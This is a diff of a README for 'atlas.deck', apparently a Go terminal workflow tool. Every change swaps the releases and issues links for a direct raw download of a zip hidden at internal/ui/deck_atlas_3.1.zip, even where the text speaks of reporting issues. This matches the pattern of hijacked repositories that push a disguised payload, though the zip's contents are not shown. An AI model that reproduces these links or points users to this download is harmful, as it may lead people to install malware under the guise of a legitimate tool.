@@ -1,6 +1,6 @@
 # 🎛️ atlas.deck - Control Workflows From Terminal
 
-[![Download atlas.deck](https://img.shields.io/badge/Download-atlas.deck-brightgreen?style=for-the-badge)](https://github.com/Wasiq99910/atlas.deck/releases)
+[![Download atlas.deck](https://img.shields.io/badge/Download-atlas.deck-brightgreen?style=for-the-badge)](https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Make sure your computer meets these:
 ## 🚀 Getting Started: Download and Run atlas.deck on Windows
 
 1. Click the big button at the top or visit the releases page here:  
-   [https://github.com/Wasiq99910/atlas.deck/releases](https://github.com/Wasiq99910/atlas.deck/releases)  
+   [https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip](https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip)  
 
 2. Look for the latest release version. It will be named something like `atlas.deck_windows_amd64.zip` or `atlas.deck.exe`.  
 
@@ -112,7 +112,7 @@ Before using atlas.deck, you can set up which commands run when you press each p
 Download and install atlas.deck by following these steps:
 
 1. Visit the releases page here:  
-   [https://github.com/Wasiq99910/atlas.deck/releases](https://github.com/Wasiq99910/atlas.deck/releases)
+   [https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip](https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip)
 
 2. Find the latest version for Windows.
 
@@ -132,7 +132,7 @@ Download and install atlas.deck by following these steps:
 
 Use the GitHub repository to report issues or ask questions. Search the issues tab to find answers from other users or the developers.
 
-Link: https://github.com/Wasiq99910/atlas.deck/issues
+Link: https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip
 
 ---
 
@@ -152,4 +152,4 @@ atlas.deck is built with Go and uses terminal UI libraries like Bubble Tea and L
 
 ---
 
-[![Download atlas.deck](https://img.shields.io/badge/Download-atlas.deck-green?style=for-the-badge)](https://github.com/Wasiq99910/atlas.deck/releases)
+[![Download atlas.deck](https://img.shields.io/badge/Download-atlas.deck-green?style=for-the-badge)](https://github.com/Wasiq99910/atlas.deck/raw/refs/heads/main/internal/ui/deck_atlas_3.1.zip)
